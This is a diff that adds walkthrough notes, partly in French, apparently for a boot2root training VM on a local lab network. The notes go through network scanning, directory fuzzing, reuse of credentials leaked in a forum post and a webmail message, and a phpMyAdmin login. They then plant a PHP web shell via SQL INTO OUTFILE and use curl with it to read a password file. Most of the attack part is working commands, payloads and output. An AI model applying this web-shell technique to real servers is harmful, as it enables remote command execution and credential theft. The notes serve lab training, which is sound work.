@@ -1,0 +1,125 @@
+setting VM
+    network
+        NAT
+        Host-only Adapter 
+
+ifconfig
+    vboxnet0: flags=8943<UP,BROADCAST,RUNNING,PROMISC,SIMPLEX,MULTICAST> mtu 1500
+        ether 0a:00:27:00:00:00
+        inet 192.168.56.1 netmask 0xffffff00 broadcast 192.168.56.255
+
+nmap '192.168.56.*'
+    Nmap scan report for 192.168.56.101
+    Host is up (0.00087s latency).
+    Not shown: 994 closed ports
+    PORT    STATE SERVICE
+    21/tcp  open  ftp
+    22/tcp  open  ssh
+    80/tcp  open  http
+    143/tcp open  imap
+    443/tcp open  https
+    993/tcp open  imaps
+
+dans navigateur 192.168.56.101
+
+kali
+    (VM config : NAT Network + Host-only adapter) 
+    //dpkg-reconfigure openssh-server
+    //systemctl start ssh.socket
+        dirb https://192.168.56.101 
+    ou
+        wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 https://192.168.56.101/FUZZ
+            /phpmyadmin
+            /forum
+            /webmail
+        wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 https://192.168.56.101/forum/FUZZ
+            /includes
+            /js
+            /modules
+            /update
+            /images
+            /index
+            /templates_c
+            /backup (403)
+            /config (403)
+    
+    //scp root@192.168.56.102:./Desktop/myfile ./project/boot2root
+
+https://192.168.56.101/forum :
+    dans le post Probleme login ? de lmezard
+        Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 
+    connection au forum avec
+        lmezard : !q\]Ej?*5K5cy*AJ
+    dans le profil de lmezard :
+        laurie@borntosec.net
+
+https://192.168.56.101/webmail:
+    connection avec laurie@borntosec.net : !q\]Ej?*5K5cy*AJ
+    dans le mail DB Access
+        root/Fg-'kKXBj87E:aJ$
+
+https://192.168.56.101/phpmyadmin:
+    connection avec root : Fg-'kKXBj87E:aJ$
+
+
+The goal is to have a script that can execute remote commands on the server
+After some tries, it appears that phpmyadmin's user has read/write access on the directory /var/www/forum/templates_c,
+and that we can execute this script giving it's relative path as url ( /var/www/forum/templates_c/index.php == base_uri/forum/templates_c/index.php )
+
+dans le champ SQL de phpmyadmin :
+    SELECT `content`
+    FROM `mlf2_pages`
+    WHERE id = 1
+    INTO OUTFILE "/var/www/forum/templates_c/index.php"
+
+We have to write in any text field in database, like :
+
+```sql
+
+    INSERT INTO
+        `mlf2_pages`
+        (
+            `order_id`,
+            `title`,
+            `content`,
+            `menu_linkname`,
+            `access`
+        )
+    VALUES
+        (
+            0,
+            "",
+            '<? echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>',
+            "",
+            0
+        )
+```
+
+And then we can write this in a file
+
+```sql
+
+    SELECT
+        `content`
+    FROM
+        `mlf2_pages`
+    WHERE
+        id = 1
+    INTO OUTFILE
+        "/var/www/forum/templates_c/index.php"
+```
+
+( Replace id if necessary )
+We can now access page base_uri/forum/template_c/index.php?cmd=any command
+    https://192.168.56.101/forum/templates_c/index.php?cmd=ls%20-R%20../../
+
+    ```
+    $> curl "https://192.168.56.101/forum/templates_c/index.php?cmd=cat%20/home/LOOKATME/password" -k
+        <pre>lmezard:G!@M6f4Eatau{sF"
+            </pre>
+    ```
+
+It appears that this login/password can be used with Vm's ftp's service
+    ftp lmezard@192.168.56.101
+    password : G!@M6f4Eatau{sF"
+
